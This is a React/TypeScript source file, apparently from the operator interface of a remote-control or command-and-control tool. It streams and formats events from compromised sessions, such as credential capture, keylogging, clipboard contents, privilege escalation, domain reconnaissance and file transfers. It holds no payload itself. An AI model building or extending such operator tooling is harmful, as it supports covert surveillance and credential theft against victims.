// 全局事件桥(挂载于认证布局顶层): 应用内唯一的 /api/events SSE 连接。
// 职责:
//   ① SSE 事件格式化后写入全局 store(总览 LiveFeed / 事件日志页共用, 对齐老前端 EventsPage 映射)
//   ② 会话上下线 → toast 即时提醒 + 失效 ['sessions'] 查询(列表秒级刷新, 不必等 3s 轮询)
//   ③ 启动时灌入历史事件(REST /api/events/history, 失败静默 —— 仅影响"进站即有上下文")
// 高频流事件(terminal_output / deskstream_data 等)不进全局日志, 只供给各自的订阅面板。
import { useEffect } from 'react'
import { useQueryClient } from '@tanstack/react-query'
import { toast } from 'sonner'
import { api, connectGlobalEvents, type CleatEvent } from '@/lib/cleat-api'
import { useEventsStore, type EventLevel } from '@/stores/events-store'

/** 高频/心跳类事件: 不入全局日志 */
const NOISY_TYPES = new Set([
  'heartbeat',
  'terminal_output',
  'file_download_data',
  'camstream_data',
  'deskstream_data',
  'audio_data',
])

interface FormattedEvent {
  level: EventLevel
  text: string
}

/** 剥离二进制/超长字段: 否则 __binary__(base64)会被整段怼进日志行, 视觉上就是乱码 */
function sanitizeData(data: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = {}
  for (const [k, v] of Object.entries(data)) {
    if (k === '__binary__') {
      const n = typeof v === 'string' ? v.length : 0
      out[k] = `(二进制 ~${Math.round((n * 3) / 4)} 字节)`
      continue
    }
    if (typeof v === 'string' && v.length > 160) {
      out[k] = v.slice(0, 160) + '…'
      continue
    }
    out[k] = v
  }
  return out
}

function textOf(data: unknown): string {
  if (data == null) return ''
  if (typeof data === 'string') return data
  const d = sanitizeData(data as Record<string, unknown>)
  if (typeof d.message === 'string' && d.message) return d.message
  if (typeof d.text === 'string' && d.text) return d.text
  if (typeof d.level === 'string' && typeof d.msg === 'string') return `${d.level}: ${d.msg}`
  const s = JSON.stringify(d)
  return s && s.length > 200 ? s.slice(0, 200) + '…' : s || ''
}

function sessionInfoOf(data: unknown): string {
  const d = (data || {}) as Record<string, unknown>
  const parts = [String(d.hostname || ''), String(d.remote_ip || ''), String(d.os || '')].filter(Boolean)
  return parts.length ? `（${parts.join(' · ')}）` : ''
}

/** SSE 事件 → 全局日志条目(返回 null 表示忽略) */
function formatEvent(ev: CleatEvent): FormattedEvent | null {
  const sid = ev.session_id ?? '?'
  const d = ev.data as Record<string, unknown> | undefined
  switch (ev.type) {
    case 'session_online':
      return { level: 'ok', text: `会话 #${sid} 上线${sessionInfoOf(d)}` }
    case 'session_offline':
      return { level: 'err', text: `会话 #${sid} 离线${sessionInfoOf(d)}` }
    case 'event_log':
      return { level: 'info', text: textOf(d) || `会话 #${sid} 事件` }
    case 'credential_data':
      return {
        level: 'info',
        text: `凭据捕获: #${sid} ${String(d?.username || '?')}${d?.realm ? '@' + String(d.realm) : ''}（${String(d?.cred_type || d?.type || 'password')}）`,
      }
    case 'discovery':
      return { level: 'info', text: `域侦察完成: #${sid} ${textOf(d)}` }
    case 'elevation':
      return { level: 'info', text: `提权结果: #${sid} ${textOf(d) || '(完成)'}` }
    case 'anti_analysis':
      return { level: 'warn', text: `反分析检测: #${sid} ${textOf(d) || '(完成)'}` }
    case 'clipboard_data':
      if (d?.type === 'files') {
        const n = Array.isArray(d.files) ? (d.files as unknown[]).length : 0
        return { level: 'info', text: `剪贴板文件: #${sid} ${n} 个` }
      }
      return { level: 'info', text: `剪贴板: #${sid} ${String(d?.text || textOf(d)).slice(0, 120)}` }
    case 'keylog':
    case 'keylog_data':
      return {
        level: 'info',
        text: `键盘记录: #${sid} ${Array.isArray(d?.entries) ? (d.entries as unknown[]).length + ' 条输入' : textOf(d)}`,
      }
    case 'file_change':
    case 'file_change_data':
      return { level: 'info', text: `文件变更: #${sid} ${String(d?.action || 'change')} ${String(d?.path || '')}` }
    case 'file_download_complete':
      return { level: 'ok', text: `下载完成: #${sid} ${String(d?.path || '')}（${String(d?.total_size ?? '?')} bytes）` }
    case 'file_download_error':
      return { level: 'err', text: `下载失败: #${sid} ${String(d?.path || '')}` }
    case 'file_upload_complete':
      return { level: 'ok', text: `上传完成: #${sid} ${String(d?.path || '')}` }
    case 'file_upload_error':
      return { level: 'err', text: `上传失败: #${sid} ${textOf(d)}` }
    default:
      return NOISY_TYPES.has(ev.type) ? null : { level: 'info', text: `${ev.type}: #${sid} ${textOf(d)}`.trim() }
  }
}

export function GlobalEventsBridge() {
  const queryClient = useQueryClient()
  const push = useEventsStore((s) => s.push)
  const seed = useEventsStore((s) => s.seed)

  useEffect(() => {
    // ① 历史事件一次性灌入(失败静默, 仅影响进站上下文)
    api
      .get<{ items: { ts: number; type: string; session_id: number; data: string }[] }>('/api/events/history?limit=100')
      .then((r) => {
        const items: { level: EventLevel; text: string; ts: number }[] = []
        for (const rec of (r.items || []).slice().sort((a, b) => a.ts - b.ts)) {
          let data: unknown = rec.data
          try {
            data = JSON.parse(rec.data)
          } catch {
            /* data 为纯文本 */
          }
          const f = formatEvent({ type: rec.type, session_id: rec.session_id, data: data as Record<string, unknown> | undefined, ts: rec.ts })
          if (f) items.push({ ...f, ts: rec.ts })
        }
        if (items.length) seed(items)
      })
      .catch(() => {})

    // ② 实时 SSE(断线 3s 自动重连, 见 connectSSE)
    const disconnect = connectGlobalEvents((ev) => {
      const f = formatEvent(ev)
      if (!f) return
      push(f.level, f.text, ev.ts)
      if (ev.type === 'session_online' || ev.type === 'session_offline') {
        if (ev.type === 'session_online') toast.success(f.text)
        else toast.error(f.text)
        // 会话上下线 → 立即刷新列表(所有 useQuery(['sessions']) 消费者)
        void queryClient.invalidateQueries({ queryKey: ['sessions'] })
      }
    })
    return disconnect
  }, [push, seed, queryClient])

  return null
}
